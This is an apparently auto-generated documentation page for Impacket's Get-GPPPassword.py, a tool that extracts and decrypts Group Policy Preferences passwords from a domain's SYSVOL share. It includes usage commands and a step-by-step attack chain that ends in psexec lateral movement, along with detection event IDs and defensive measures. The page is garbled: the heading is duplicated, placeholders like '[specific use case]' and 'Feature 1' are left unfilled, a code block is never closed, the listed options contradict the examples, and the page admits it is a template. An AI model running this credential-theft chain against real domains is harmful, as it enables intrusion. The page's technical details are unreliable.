# Get-GPPPassword.py

## Overview
`Get-GPPPassword.py` is a extract group policy passwords tool in the Impacket suite. This tool is categorized under Active Directory and provides functionality for [specific use case].

## Detailed Description
# Get-GPPPassword.py

## Overview
`Get-GPPPassword.py` is a Group Policy Preferences password extraction tool in the Impacket suite. This tool is categorized under Credential Extraction and provides functionality for discovering and decrypting passwords stored in Group Policy Preferences XML files.

## Detailed Description
`Get-GPPPassword.py` searches for and decrypts passwords stored in Group Policy Preferences (GPP) files. GPP allows administrators to deploy passwords through group policy, but Microsoft's implementation uses a known AES key, making these passwords easily decryptable. The tool searches SYSVOL shares for GPP XML files containing encrypted passwords (cpassword attribute) and decrypts them using the known key.

### Key Features:
- **Feature 1**: Description of primary feature
- **Feature 2**: Description of secondary feature
- **Feature 3**: Description of additional feature
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication
- **Cross-Platform Compatibility**: Works with various Windows versions

### Technical Details:
- Uses [specific protocol/technique]
- Leverages [specific Windows API/service]
- Implements [specific attack technique]
- Compatible with [specific versions/systems]

## Command Line Options

```
usage: Get-GPPPassword.py [-h] [options] target

Required Arguments:
  target                [Description of target parameter]

Optional Arguments:
  -h, --help            Show help message
  [Add specific options based on tool functionality]

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
```

## Usage Examples

### Basic Usage
```bash
# Basic command execution
python3 Get-GPPPassword.py [basic_parameters]

# With authentication
python3 Get-GPPPassword.py domain.com/user:password@target.domain.com

# Using hash authentication
python3 Get-GPPPassword.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Search specific SYSVOL share path
python3 Get-GPPPassword.py -xmlfile "\\\\dc.domain.com\\SYSVOL\\domain.com\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml"

# Extract from specific domain controller
python3 Get-GPPPassword.py -dc-ip 192.168.1.10 domain.com/user:password

# Batch processing multiple XML files
find /mnt/sysvol -name "*.xml" -exec python3 Get-GPPPassword.py -xmlfile {} \;
```

## Attack Chain Integration

### Domain Privilege Escalation via GPP
```bash
# Step 1: Enumerate accessible SYSVOL shares
python3 smbclient.py domain.com/user:password@dc.domain.com

# Step 2: Extract GPP passwords
python3 Get-GPPPassword.py domain.com/user:password@dc.domain.com

# Step 3: Use discovered credentials for lateral movement
python3 psexec.py domain.com/discovered_user:discovered_pass@target
```

### Post-compromise Domain Reconnaissance
```bash
# Step 1: Gain initial domain access
python3 getTGT.py domain.com/user:password

# Step 2: Search for GPP passwords across domain
python3 Get-GPPPassword.py domain.com/user:password@dc.domain.com

## Prerequisites
- Network access to domain controller SYSVOL share (port 445)
- Valid domain credentials (any authenticated user)
- Python 3.x with Impacket installed
- Access to SYSVOL directory structure

## Detection Considerations
- **Event IDs**: 
  - Event ID 4624/4625 (Authentication to domain controller)
  - Event ID 5140/5145 (SMB share access to SYSVOL)
  - Event ID 4663 (File access auditing for GPO files)
- **Network Indicators**: 
  - SMB connections to domain controllers on port 445
  - Access to SYSVOL share and GPO directories
  - XML file reads from Group Policy directories
- **Process Indicators**: 
  - Python processes accessing SMB shares
  - File system access to domain controller SYSVOL
- **File Indicators**: 
  - Access to Groups.xml, Services.xml, ScheduledTasks.xml files
  - Reading of GPO preference files
- **Registry Indicators**: 
  - No direct registry modifications

## Defensive Measures
- Remove all Group Policy Preferences containing passwords
- Enable file access auditing on SYSVOL directory
- Monitor access to sensitive GPO files and directories
- Implement least privilege access to SYSVOL shares
- Regular auditing of Group Policy configurations
- Use LAPS (Local Administrator Password Solution) instead of GPP

## Common Issues and Troubleshooting

### Access Denied to SYSVOL
```bash
# Problem: Cannot access SYSVOL share
# Solution: Verify domain credentials and network connectivity
smbclient.py domain/user:pass@dc.domain.com
python3 Get-GPPPassword.py domain/user:pass@dc.domain.com
```

### No GPP Files Found
```bash
# Problem: Script doesn't find any Group Policy Preference files
# Solution: Verify GPP files exist and search specific paths
find /mnt/sysvol -name "*.xml" -type f
python3 Get-GPPPassword.py -xmlfile "specific_path/Groups.xml"
```

## Related Tools
- [smbclient.py](smbclient.md) - SMB client for SYSVOL access
- [secretsdump.py](secretsdump.md) - Extract other types of credentials
- [GetADUsers.py](GetADUsers.md) - Enumerate domain users
- [psexec.py](psexec.md) - Use discovered credentials for lateral movement

---

*Note: This documentation is a template. Please refer to the actual tool's help output and source code for complete and accurate information.*
